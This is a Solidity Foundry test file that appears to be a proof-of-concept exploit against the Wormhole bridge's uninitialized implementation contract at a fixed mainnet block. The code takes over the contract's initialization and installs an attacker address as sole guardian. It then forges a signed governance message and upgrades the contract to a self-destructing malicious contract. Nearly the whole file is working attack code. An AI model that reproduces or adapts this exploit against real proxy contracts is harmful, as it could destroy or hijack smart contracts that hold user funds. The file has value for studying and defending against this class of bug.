// SPDX-License-Identifier: UNLICENSED
// The wormhole proxy address 0x98f3c9e6E3fAce36bAAd05FE09d375Ef1464288B
// The implementation slot 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
// Block number 13818843
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/MaliciousContract.sol";
import "Wormhole/home/name/Desktop/jump/wormhole/ethereum/contracts/IWormholeImpl.sol";
import "Implementation/Implementation/contracts/Structs.sol";

contract ContractTest is Test {
    using stdStorage for StdStorage;
    // The malicious contract which is going to self destruct
    MaliciousContract malicious_contract;
    // The attacker wallet addr
    address[] attackers;

    event ContractUpgraded(address indexed oldContract, address indexed newContract);

    function setUp() public {
        // Our contract which has the selfdestruct
        malicious_contract = new MaliciousContract();
        // create our attacker address list
        attackers = new address[](1);
        attackers[0] = vm.addr(1);
    }

    function getWormholeImplementation() private returns (address) {
        // The implementation could be extracted through the cast tool but we are going to use the load foundry function
        // $ cast storage 0x98f3c9e6E3fAce36bAAd05FE09d375Ef1464288B 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --block 13818843
        bytes32 wim = vm.load(
            address(0x98f3c9e6E3fAce36bAAd05FE09d375Ef1464288B),
            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
        );
        return address(uint160(uint256(wim)));
        
    }

    function getVM(uint16 _govChainId, bytes32 _govContract, uint32 _guardianIndex) private returns (bytes memory) {
        // Create a hash of body then create a signature
        bytes memory hash_body = abi.encodePacked(
            uint32(0),  // timestamp
            uint32(0),  // nonce
            _govChainId,
            _govContract,
            uint64(0),  // sequence
            uint8(2)  // consistencyLevel
        );

        // The hashed "Core" word
        bytes memory hash_core = new bytes(33);
        assembly {
            mstore(add(hash_core, 33), 0x00000000000000000000000000000000000000000000000000000000436f726501)
            pop(mload(add(hash_core, 33)))
        }

        // Concatenate the hash body and the malicious_contract
        bytes memory full_hash = bytes.concat(
            hash_body,
            hash_core,
            abi.encodePacked(uint16(0)),
            abi.encode(address(malicious_contract))
        );

        // Create the signatura
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
            1,
            keccak256(abi.encodePacked(keccak256(full_hash))));
        Structs.Signature memory signature = Structs.Signature({
            r: r,
            s: s,
            v: v,
            guardianIndex: uint8(0)
        });
        Structs.Signature[] memory signatures = new Structs.Signature[](1);
        signatures[0] = signature;

        // Return the VM
        return abi.encodePacked(
            uint8(1),
            uint32(_guardianIndex),
            uint8(signatures.length),
            uint8(0),
            signature.r,
            signature.s,
            uint8(1),
            full_hash
        );
    }

    function testExploit() public {
        IWormholeImpl wormhole_implementation = IWormholeImpl(getWormholeImplementation());
        // // Assert the logic contract chainId
        assertEq(wormhole_implementation.chainId(), 0);

        // Initialize the implementation, the parameters could be found here
        // https://etherscan.io/address/0x736d2a394f7810c17b3c6fed017d5bc7d60c077d#code#F4#L33
        // function initialize(address[] memory initialGuardians, uint16 chainId, uint16 governanceChainId, bytes32 governanceContract)
        wormhole_implementation.initialize(attackers, 0, 0, 0x0);

        // Get our crafted VM
        bytes memory vmWorm = getVM(
            wormhole_implementation.governanceChainId(),
            wormhole_implementation.governanceContract(),
            wormhole_implementation.getCurrentGuardianSetIndex()
        );

        // Check for the contract upgraded to our malicious_contract
        vm.expectEmit(false, true, false, false);
        emit ContractUpgraded(address(wormhole_implementation), address(malicious_contract));

        // Upgrade to the new contract
        wormhole_implementation.submitContractUpgrade(vmWorm);
    }
}
